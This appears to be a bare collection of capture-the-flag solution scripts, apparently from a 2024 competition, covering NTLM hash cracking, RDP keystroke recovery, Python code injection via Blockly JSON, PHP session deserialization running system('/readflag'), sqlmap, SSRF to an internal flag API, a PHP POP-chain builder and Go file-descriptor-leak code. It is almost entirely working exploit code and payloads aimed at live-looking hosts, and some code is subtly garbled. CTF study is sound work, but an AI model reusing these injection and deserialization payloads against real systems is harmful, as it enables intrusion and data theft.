tom::.:
c1dec53240124487:
ca32f9b5b48c04ccfa96f35213d63d75:
010100000000000040d0731fb92adb01221434d6e24970170000000002001e004400450053004b0054004f0050002d004a0030004500450039004d00520001001e004400450053004b0054004f0050002d004a0030004500450039004d00520004001e004400450053004b0054004f0050002d004a0030004500450039004d00520003001e004400450053004b0054004f0050002d004a0030004500450039004d0052000700080040d0731fb92adb0106000400020000000800300030000000000000000100000000200000bd69d88e01f6425e6c1d7f796d55f11bd4bdcb27c845c6ebfac35b8a3acc42c20a001000000000000000000000000000000000000900260063006900660073002f003100370032002e00310036002e003100300035002e003100320039000000000000000000
python3 1.py --user tom --domain . 
--password babygirl233 
--ntproofstr ca32f9b5b48c04ccfa96f35213d63d75 
--key 5643a37f253b00b2f52df1afd48c1514 -v

USER+DOMAIN: TOM.
PASS HASH: 793c1cef91fa0721f0cd120195390f17
RESP NT:   1361bed8787c0e409f1fd731b9cae4fa
NT PROOF:  ca32f9b5b48c04ccfa96f35213d63d75
KeyExKey:  7858bfa4fe1ee01ca2122fc9730e18ab
Random SK: a3abe4d64394909a641062342ffe291b
import re

normalKeys = {
    0: " reserved ", 1: " esc ", 2: "1", 3: "2", 4: "3", 5: "4", 6: "5", 7: "6", 8: "7", 9: "8", 10: "9", 11: "0",
    12: "-", 13: "=", 14: "***backspace***", 15: "t", 16: "q", 17: "w", 18: "e", 19: "r", 20: "t", 21: "y", 22: "u",
    23: "i", 24: "o", 25: "p", 26: "{", 27: "}", 28: "n", 29: " leftctrl ", 30: "a", 31: "s", 32: "d", 33: "f",
    34: "g", 35: "h", 36: "j", 37: "k", 38: "l", 39: " semicolon ", 40: "'", 41: " grave ", 42: "[leftshift]",
    43: " backslash ", 44: "z", 45: "x", 46: "c", 47: "v", 48: "b", 49: "n", 50: "m", 51: " comma ", 52: " dot ",
    53: " slash ", 54: "[rightshift]", 55: " kpasterisk ", 56: "[leftalt]", 57: " ", }

res = ""
with open("1.json", "r", encoding="utf-8") as f:
    dat = f.read()
    finds = re.findall(r'eventheader": "0x01"[wW]*?"rdp.fastpath.scancode.keycode": "0x([0-9a-f]{2})"', dat)
    for i in finds:
        x = int(i, 16)
        if x in normalKeys:
            print(normalKeys[x], end="")
the[leftshift] 7z password is f'{[leftshift]windows-[leftshift]password}[leftshift]9347013182'
import requests
import json
import threading

url = "http://eci-2zedptpxwuwj344tkegy.cloudeci1.ichunqiu.com:
5000"

data = {
    "blocks": {
        "blocks": [
            {
                "type": "print",
                "x": 101,
                "y": 102,
                "inputs": {
                    "TEXT": {
                        "block": {
                            "type": "max",
                            "inputs": {
                                "A": {
                                    "block": {
                                        "type": "text",
                                        "fields": {"TEXT": "‘，‘’））n（open（bytes。fromhex（’72756e2e7079‘）。decode（），’wb‘）。write（bytes。fromhex（’696d706f7274206f730a0a7072696e74286f732e706f70656e282764642069663d2f666c616727292e72656164282929‘）））nnprint（print（’1"}
                                    }
                                },
                                "B": {
                                    "block": {
                                        "type": "math_number",
                                        "fields": {"NUM": 10}
                                    }
                                }
                            }
                        }
                    }
                }
            }
        ]
    }
}

def send_request():
    while True:
        r = requests.post(url + "/blockly_json",
                          headers={"Content-Type": "application/json"}, data=json.dumps(data))
        text = r.text
        if "1 10" not in text and "No such file or direct" not in text and len(text) > 10:
            print(text)
            os.exit(-1)
            break

threads = []
num_threads = 100

for _ in range(num_threads):
    thread = threading.Thread(target=send_request)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
import hashlib
import itertools

salt = 'bf3a27'
target_hash = 'cd68b9fa89089351c31f248f7a321583'
chars = '0123456789abcdef'
max_length = 6

for length in range(1, max_length + 1):
    for password_tuple in itertools.product(chars, repeat=length):
        password = ''.join(password_tuple)
        hash_attempt = hashlib.md5((password + salt).encode()).hexdigest()
        if hash_attempt == target_hash:
            print(f'Found password: {password}')
            break
import requests
import os

# url = "http://127.0.0.1:
8888"
url = "http://eci-2zeg97hlr4shg75wqoyp.cloudeci1.ichunqiu.com:80"

while True:
    data = {
        "username": "exec"*9+"popen",
        "password": ';session_key|O:15:"notouchitsclass":1:{s:4:"data";s:28:"syssystemtem("/readflag;ls -alh");";}user|s:1:"1aaaa'
    }
    sess = os.urandom(8).hex()
    r = requests.post(url + "/index.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)
    r = requests.post(url + "/index.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)

    r = requests.post(url + "/dashboard.php", data=data, headers={
        "Cookie": f"PHPSESSID={sess}"}, allow_redirects=False)

    text = r.text
    if 'total ' in text:
        print(text)
        print(sess)
        break
python3 sqlmap.py -r 1.txt --dbms=sqlite --level 2 --threads 8 --tables
+-----------------+
| sqlite_sequence |
| users |
+-----------------+
import requests
import json

url = "http://47.93.99.173:
24678/v2/api/proxy"

headers = {
    "Content-Type": "application/json",
}

data = {
    "url": "http://localhost:
8769/v1/api/flag",
    "method": "POST",
    "body": "",
    "headers": {},
    "follow_redirects": False,
}

response = requests.post(url, headers=headers, data=json.dumps(data))

print(response.text)
echo "ZmxhZ3s1ZjZiYjhjMC1iZmZlLTQxYTQtYTRjMC1kNTE1MGFmYTA1NTd9" | base64 -d
flag{5f6bb8c0-bffe-41a4-a4c0-d5150afa0557}⏎
function filter($password){
    $filter_arr = array("admin","2024qwb");
    $filter = '/'.implode("|",$filter_arr).'/i';
    return preg_replace($filter,"nonono",$password);
}
class guest{
    public $username;
    public $value;
    public function __tostring(){
        if($this->username=="guest"){
            $value();
        }
        return $this->username;
    }
    public function __call($key,$value){
        if($this->username==md5($GLOBALS["flag"])){
            echo $GLOBALS["flag"];
        }
    }
}
class root{
    public $username;
    public $value;
    public function __get($key){
        if(strpos($this->username, "admin") == 0 && $this->value == "2024qwb"){
            $this->value = $GLOBALS["flag"];
            echo md5("hello:".$this->value);
        }
    }
}
class user{
    public $username;
    public $password;
    public $value;
    public function __invoke(){
        $this->username=md5($GLOBALS["flag"]);
        return $this->password->guess();
    }
    public function __destruct(){
        if(strpos($this->username, "admin") == 0 ){
            echo "hello".$this->username;
        }
    }
}
$user=unserialize(filter($_POST["password"]));
if(strpos($user->username, "admin") == 0 && $user->password == "2024qwb"){
    echo "hello!";
}
$obj = new root();
$g1 = new guest();
$g1->username = "admin";
$obj->username = $g1;
$u1 = new user();
$u1->username = "2024qwb";
$g1->value = $u1;
$obj->value = &$u1->username;

echo "n";
echo serialize($obj);
echo "n";
package main
import (
  "fmt"
  "os"
  "os/signal"
  "syscall"
)

func main() {
  sigc := make(chan os.Signal, 1)
  signal.Notify(sigc, syscall.SIGALRM)
  go func() { _ = <-sigc; os.Exit(1); }()
  syscall.Syscall(syscall.SYS_ALARM, 1, 0, 0)

  buf := make([]byte, 12345)
  for i := 0; i < 100; i++ {
    for true {
      n, _, err := syscall.Recvfrom(i, buf, 0)
      if err != nil || n == 0 {
        break
      }
      if n != 12345 {
        fmt.Printf("%d: (%d) %xn", i, n, buf[:n])
      }
    }
  }
}
PROG = '<上面的程序>'

def work_thread():
    while True:
        j = requests.post('http://XXXXXX:
5000/api/run', json={'code': PROG}).json()
        if j['status'] == 'success':
            print(base64.b64decode(j['data']).decode())

for _ in range(8):
    threading.Thread(target=work_thread).start()
package main
import (
  "bufio"
  "bytes"
  "encoding/binary"
  "encoding/hex"
  "fmt"
  "os"
  "syscall"
  "unsafe"
)

func main() {
  key, err := hex.DecodeString("<key>")
  exe, err := hex.DecodeString("")

  socket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)

  var addr syscall.SockaddrInet4
  addr.Port = 2077
  addr.Addr = [4]byte{127, 0, 0, 1}
  err = syscall.Connect(socket, &addr)

  chall := make([]byte, 0x40)
  n, _, err := syscall.Recvfrom(socket, chall, 0)
  for i, b := range key {
    chall[i] ^= b
  }
  for i, _ := range exe {
    exe[i] ^= key[i % len(key)]
  }

  var buf bytes.Buffer
  writer := bufio.NewWriter(&buf)
  binary.Write(writer, binary.LittleEndian, int32(len(exe) + len(chall)))
  binary.Write(writer, binary.LittleEndian, int32(48))
  writer.Write(chall)
  writer.Write(exe)
  writer.Flush()
  syscall.Sendto(socket, buf.Bytes(), 0, nil)

  buf2 := make([]byte, 1024)
  for true {
    n, _, err := syscall.Recvfrom(socket, buf2, 0)
    if err != nil || n == 0 {
      break
    }
    fmt.Printf("%xn", buf2[:n])
  }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730680982.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/9-1730680982.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730680983.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1730680984.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/1-1730680984.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/5-1730680984.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1730680985.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1730680986.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1730680986.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/3-1730680987.jpeg)